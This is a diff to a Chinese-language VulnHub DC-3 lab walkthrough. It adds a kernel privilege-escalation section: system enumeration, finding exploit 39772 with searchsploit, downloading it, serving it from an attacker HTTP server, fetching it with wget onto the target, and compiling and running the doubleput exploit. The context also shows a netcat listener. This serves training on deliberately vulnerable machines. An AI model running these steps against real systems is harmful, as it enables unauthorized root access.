@@ -85,7 +85,35 @@ nc -lnvp 1337
 
 ![](./img/vulnhub-dc3-10.png)
 
-可见权限是www-data，接下来是提权
+可见权限是www-data，接下来是内核提权
+
+信息收集
+```bash
+lsb_release -a
+uname -a
+```
+
+![](./img/vulnhub-dc3-11.png)
+
+```bash
+searchsploit ubuntu 16.04 4.4.x
+earchsploit -m 39772
+cat 39772.txt
+proxychains4 wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+```
+
+传输exp
+```
+python -m SimpleHTTPServer 80
+wget http://10.30.0.81/39772.zip
+unzip 39772.zip && cd 39772 && tar -xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit && sh compile.sh
+./doubleput
+```
+
+![](./img/vulnhub-dc3-12.png)
+![](./img/vulnhub-dc3-13.png)
+
 ## 参考链接
 - https://github.com/ffffffff0x/1earn/blob/004fbc731d7ce8004b9c2a38613d39f71cd8cb6e/1earn/Security/%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E9%9D%B6%E6%9C%BA/VulnHub/DC/DC3-WalkThrough.md
 - http://www.kxsy.work/2021/08/11/shen-tou-dc-3/
